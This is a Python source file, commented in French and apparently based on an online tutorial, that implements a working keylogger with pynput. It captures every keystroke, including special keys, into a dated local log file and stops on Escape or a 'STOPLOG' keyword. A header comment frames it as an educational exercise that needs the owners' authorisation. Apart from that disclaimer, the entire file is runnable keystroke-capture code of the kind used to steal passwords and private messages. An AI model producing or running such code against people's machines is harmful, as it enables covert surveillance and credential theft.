# key.py - Un keylogger simple utilisant pynput
# Enregistre les frappes dans un fichier journal quotidien
#, et s'arrête lorsque le mot-clé "STOPLOG" est détecté

# DANGER : ceci est un exercice éducatif. N'utilisez ce code qu'avec l'autorisation explicite des propriétaires des systèmes ciblés.

# Tuto src=https://blog.crea-troyes.fr/5753/coder-un-keylogger-en-python-guide-complet/#aioseo-preparer-son-environnement
from pynput.keyboard import Listener, Key
import logging
from datetime import datetime

# Création d'un fichier de log quotidien
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
logging.basicConfig(
    filename=log_filename,
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

buffer = ""  # Stocke les dernières frappes pour le mot-clé d'arrêt

def on_press(key):
    global buffer
    try:
        # Capture des lettres et chiffres
        touche = key.char
        buffer += touche
        logging.info(touche)
    except AttributeError:
        try:
            # Gestion des touches spéciales
            if key == Key.space:
                buffer += " "
                logging.info(" [ESPACE] ")
            elif key == Key.enter:
                buffer += "\n"
                logging.info(" [ENTREE] ")
            elif key == Key.tab:
                buffer += "\t"
                logging.info(" [TABULATION] ")
            elif key == Key.backspace:
                buffer = buffer[:-1]
                logging.info(" [SUPPR] ")
            else:
                logging.info(f" [{key}] ")
        except Exception as e:
            print(f"Erreur lors du traitement de la touche : {e}")

    # Arrêt si mot-clé détecté
    if "STOPLOG" in buffer:
        print("Mot-clé d'arrêt détecté. Keylogger arrêté.")
        return False

def on_release(key):
    # Arrêt si touche Échap
    if key == Key.esc:
        print("Touche Échap pressée. Keylogger arrêté.")
        return False

# Lancement du listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger lancé. Appuyez sur Échap ou tapez 'STOPLOG' pour arrêter.")
    listener.join()